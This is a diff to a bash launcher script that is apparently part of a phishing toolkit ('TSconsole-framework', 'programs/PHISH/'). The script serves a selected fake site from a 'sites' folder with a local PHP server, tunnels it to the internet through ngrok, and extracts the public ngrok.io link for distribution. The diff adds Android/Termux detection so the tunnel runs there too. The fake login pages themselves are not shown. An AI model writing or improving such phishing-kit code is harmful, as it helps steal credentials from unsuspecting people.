@@ -1,19 +1,6 @@
 #!/bin/bash
 #<<<----------DISTRO VERIFICATION---------->>>
-#cd $HOME
-distro=$(pwd)
-#if [[ $distro == '/data/data/com.termux/files/home' ]]; then
-#	PWD='/data/data/com.termux/files/usr/share/TSconsole-framework/programs/PHISH/'
-#        Ngrok='termux-chroot ./ngrok'
-#elif [[ $distro == '/data/data/hilled.pwnterm/files/usr/home' ]]; then
-#        printf "\e[1;31m Please switch on your mobile hotspot!!\e[0m\n"
-#	Ngrok='./ngrok'
-#        PWD='/data/data/hilled.pwnterm/files/usr/share/TSconsole-framework/programs/PHISH/'
-#else
-#        Ngrok='./ngrok'
-#        PWD='/usr/share/TSconsole-framework/programs/PHISH/'
-#fi
-#cd ${PWD}
+distro=$(uname -o)
 #<<<---------banner---------->>>
 __banner__() {
 cat banner | pv -qL 300 | lolcat
@@ -128,6 +115,7 @@ echo
 fi
 done
 
+
 cd sites/
 cd ${pfolder}/
 echo
@@ -136,8 +124,12 @@ printf "${C2}..........${R0}\n" | pv -qL 10
 php -S 127.0.0.1:4444 > /dev/null 2>&1 &
 sleep 3
 echo
+if [[ $distro == *'Android'* ]]; then
+termux-chroot ./ngrok http 4444 > /dev/null 2>&1 &
+else
 ./ngrok http 4444 > /dev/null 2>&1 &
-sleep 15
+fi
+sleep 7
 echo
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
 echo; wait
